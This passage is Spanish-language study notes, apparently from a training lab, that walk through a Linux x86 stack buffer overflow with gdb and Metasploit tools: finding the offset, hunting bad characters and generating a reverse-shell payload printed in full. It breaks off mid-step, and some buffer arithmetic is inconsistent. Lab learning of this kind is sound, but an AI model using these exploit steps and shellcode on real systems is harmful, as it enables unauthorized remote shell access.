
# Buffer Overflow en Linux

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a sobreescribir la memoria de un buffer y ejecutar una reverse shell, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Buffer Overflow en Linux</mark>

***

Nos conectamos por SSH al host

```bash
gdb -q leave_msg # O programa que contenga el host
run $(python -c "print '\x55' * 1200")
```

### 1. Subir el 1200 hasta que de un error

```python
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555	# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555	# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

### 2. Saber el número exacto en el que da el fallo

* Aproximarnos lo máximo que podamos
* En el número 2100 falla lo más cercano
* Usamos Metasploit Tools para generar un pattern

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7-----SNIP-----0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9
```

Lo ejecutamos con python en GDB:

{% code overflow="wrap" %}

```python
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9'")
```

{% endcode %}

```
info registers
EIP: 0x37714336
```

* Vemos el offset con Metasploit Tools:

{% code overflow="wrap" %}

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336 [*] Exact match at offset 2060
```

{% endcode %}

Encontramos el offset en `2060`

```python
(gdb) run $(python -c "print '\x55' * 2060 + '\x66' * 4")
(gdb) info proc all

0xfffdc000 0xffffe000    0x22000        0x0 [stack]
```

### 3. Determinar la longitud del shellcode

{% code overflow="wrap" %}

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

Payload size: 68 bytes
Final size of c file: 311 bytes
```

{% endcode %}

{% code title="Longitud del Shellcode" %}

```python
   Buffer = "\x55" * (2064 - 100 - 150 - 4) = 1810
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```

{% endcode %}

{% code overflow="wrap" %}

```python
(gdb) run $(python -c 'print "\x55" * (2064 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

(gdb) info registers 0x66666666 #Es correcto
```

{% endcode %}

### 4. Identificar Bad Characters:

{% code overflow="wrap" %}

```python
htb-student@nixbof32skills:~$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

echo $CHARS | sed 's/\x/ /g' | wc -w
256
```

{% endcode %}

* Calcular buffer de nuevo:

{% code title="" %}

```python
Buffer = "\x55" * (2064 - 256 - 4) = 1804
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

{% endcode %}

{% code overflow="wrap" %}

```python
(gdb) run $(python -c 'print("\x55" * (2064 - 256 - 4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4)')
```

{% endcode %}

```python
(gdb) disas main

Dump of assembler code for function main:
   0x56555582 <+0>: 	lea    ecx,[esp+0x4]
   0x56555586 <+4>: 	and    esp,0xfffffff0
   0x56555589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x5655558c <+10>:	push   ebp
   0x5655558d <+11>:	mov    ebp,esp
   0x5655558f <+13>:	push   ebx
   0x56555590 <+14>:	push   ecx
   0x56555591 <+15>:	call   0x56555450 <__x86.get_pc_thunk.bx>
   0x56555596 <+20>:	add    ebx,0x1a3e
   0x5655559c <+26>:	mov    eax,ecx
   0x5655559e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x565555a1 <+31>:	add    eax,0x4
   0x565555a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x565555a6 <+36>:	sub    esp,0xc
   0x565555a9 <+39>:	push   eax
   0x56555778 <+61>:	call   0x5655568d <leavemsg>	# <---- leavemsg Function
   0x565555af <+45>:	add    esp,0x10
   0x565555b2 <+48>:	sub    esp,0xc
   0x565555b5 <+51>:	lea    eax,[ebx-0x1974]
   0x565555bb <+57>:	push   eax
   0x565555bc <+58>:	call   0x565553e0 <puts@plt>
   0x565555c1 <+63>:	add    esp,0x10
   0x565555c4 <+66>:	mov    eax,0x1
   0x565555c9 <+71>:	lea    esp,[ebp-0x8]
   0x565555cc <+74>:	pop    ecx
   0x565555cd <+75>:	pop    ebx
   0x565555ce <+76>:	pop    ebp
   0x565555cf <+77>:	lea    esp,[ecx-0x4]
   0x565555d2 <+80>:	ret    
End of assembler dump.
```

### 5. GDB Breakpoint:

{% code overflow="wrap" %}

```python
break leavemsg

(gdb) run $(python -c 'print("\x55" * (2064 - 256 - 4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4)')

Breakpoint 1, 0x56555691 in leavemsg ()
```

{% endcode %}

* Hemos alcanzado el breakpoint.

### 6. Ver el Stack:

```python
(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
                      # |---> "\x55" empieza

0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

* Vemos que se sobreescribe el buffer donde terminan los 0x55
* Empieza por 0x01 en vez de 0x00, nos mostró un error de null byte ignored

```
/bin/bash: warning: command substitution: ignored null byte in input
```

* Eliminamos el 0x00 de la ecuación, por lo que será 1 byte menos:

```python
"\x00" eliminado: 256 - 1 = 255 bytes
```

* Ajustamos el buffer de nuevo sin el `x00`:

{% code title="" %}

```bash
Buffer = "\x55" * (2064 - 255 - 4) = 1803
 CHARS = "\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

{% endcode %}

{% code overflow="wrap" %}

```python
(gdb) run $(python -c 'print("\x55" * (2064 - 255 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4)')
```

{% endcode %}

{% code title="Stack" overflow="wrap" %}

```python
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
                                                     # |----| <- "\x09" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

{% endcode %}

* Eliminamos también de la ecuación el `0x09` y lo volvemos a enviar:

{% code title="Notas" %}

```python
Buffer = "\x55" * (2064 - 254 - 4) = 782	

# "\x00" & "\x09" eliminados: 256 - 2 = 254 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
```

{% endcode %}

{% code overflow="wrap" %}

```python
(gdb) run $(python -c 'print("\x55" * (2064 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4)')
```

{% endcode %}

<pre class="language-python" data-overflow="wrap"><code class="lang-python">(gdb) x/2000xb $esp+550

&#x3C;SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
<strong>                                                     # |----| &#x3C;- "\x0a" expected
</strong>
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
&#x3C;SNIP>
</code></pre>

* Repetir este proceso hasta que no aparezca ningún null byte 0x00

#### Código final sin ningún null byte:

{% code overflow="wrap" %}

```python
(gdb) run $(python -c 'print("\x55" * (2064 - 252 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4)')
```

{% endcode %}

{% code title="Sin ningún null byte" %}

```python
0xffffd690:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd698:	0x55	0x55	0x55	0x55	0x55	0x55	0x01	0x02
                                     # Empiezan los caracteres |----| 
                                     
0xffffd6a0:	0x03	0x04	0x05	0x06	0x07	0x08	0x0b	0x0c
0xffffd6a8:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd6b0:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
0xffffd6b8:	0x1d	0x1e	0x1f	0x21	0x22	0x23	0x24	0x25
0xffffd6c0:	0x26	0x27	0x28	0x29	0x2a	0x2b	0x2c	0x2d
0xffffd6c8:	0x2e	0x2f	0x30	0x31	0x32	0x33	0x34	0x35
0xffffd6d0:	0x36	0x37	0x38	0x39	0x3a	0x3b	0x3c	0x3d
0xffffd6d8:	0x3e	0x3f	0x40	0x41	0x42	0x43	0x44	0x45
0xffffd6e0:	0x46	0x47	0x48	0x49	0x4a	0x4b	0x4c	0x4d
0xffffd6e8:	0x4e	0x4f	0x50	0x51	0x52	0x53	0x54	0x55
0xffffd6f0:	0x56	0x57	0x58	0x59	0x5a	0x5b	0x5c	0x5d
0xffffd6f8:	0x5e	0x5f	0x60	0x61	0x62	0x63	0x64	0x65
0xffffd700:	0x66	0x67	0x68	0x69	0x6a	0x6b	0x6c	0x6d
0xffffd708:	0x6e	0x6f	0x70	0x71	0x72	0x73	0x74	0x75
0xffffd710:	0x76	0x77	0x78	0x79	0x7a	0x7b	0x7c	0x7d
0xffffd718:	0x7e	0x7f	0x80	0x81	0x82	0x83	0x84	0x85
0xffffd720:	0x86	0x87	0x88	0x89	0x8a	0x8b	0x8c	0x8d
```

{% endcode %}

#### Los Bad Characters detectados son:&#x20;

```python
\x00\x09\x0a\x20 # Son necesarios para generar el shellcode
```

### 7. Generando el shellcode:

{% code overflow="wrap" %}

```bash
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

cat shellcode

unsigned char buf[] = "\xdb\xc5\xd9\x74\x24\xf4\xbf\xb5\x28\xa8\x8f\x5d\x29\xc9" "\xb1\x12\x31\x7d\x17\x83\xc5\x04\x03\xc8\x3b\x4a\x7a\x03" "\xe7\x7d\x66\x30\x54\xd1\x03\xb4\xd3\x34\x63\xde\x2e\x36" "\x17\x47\x01\x08\xd5\xf7\x28\x0e\x1c\x9f\xd5\xf0\xde\x5e" "\x42\xf3\xde\x1a\xfb\x7a\x3f\x6a\x9d\x2c\x91\xd9\xd1\xce" "\x98\x3c\xd8\x51\xc8\xd6\x8d\x7e\x9e\x4e\x3a\xae\x4f\xec" "\xd3\x39\x6c\xa2\x70\xb3\x92\xf2\x7c\x0e\xd4";

Payload size: 95 bytes 
Final size of c file: 425 bytes
```

{% endcode %}

* Editarlo en oneliner siguiendo el siguiente esquema:

{% code title="" %}

```bash
   Buffer = "\x55" * (2064 - 100 - 95 - 4) = 1873
     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

{% endcode %}

{% code overflow="wrap" %}

```python
(gdb) run $(python -c 'print("\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xc5\xd9\x74\x24\xf4\xbf\xb5\x28\xa8\x8f\x5d\x29\xc9\xb1\x12\x31\x7d\x17\x83\xc5\x04\x03\xc8\x3b\x4a\x7a\x03\xe7\x7d\x66\x30\x54\xd1\x03\xb4\xd3\x34\x63\xde\x2e\x36\x17\x47\x01\x08\xd5\xf7\x28\x0e\x1c\x9f\xd5\xf0\xde\x5e\x42\xf3\xde\x1a\xfb\x7a\x3f\x6a\x9d\x2c\x91\xd9\xd1\xce\x98\x3c\xd8\x51\xc8\xd6\x8d\x7e\x9e\x4e\x3a\xae\x4f\xec\xd3\x39\x6c\xa2\x70\xb3\x92\xf2\x7c\x0e\xd4" + "\x66" * 4)')
```

{% endcode %}

```python
x/2000xb $esp+500 # Vemos el buffer
```

### 8. Dirección de memoria donde queremos escribir nuestro payload:

Donde empiezan los `0x90`:

```python
0xffffd6bc:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd6c4:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd6cc:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd6d4:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x90
# ---- Empezamos a inyectar aquí nuestro shellcode ----
0xffffd6dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
```

```python
0xffffd6dc -> \xdc\xd6\xff\xff # Empieza a contar de 2 en 2 desde la derecha
```

Editamos el buffer de nuevo para agregar esta dirección en el EIP:

{% code title="Notas" %}

```python
   Buffer = "\x55" * (2064 - 100 - 95 - 4) = 1865
     NOPs = "\x90" * 100
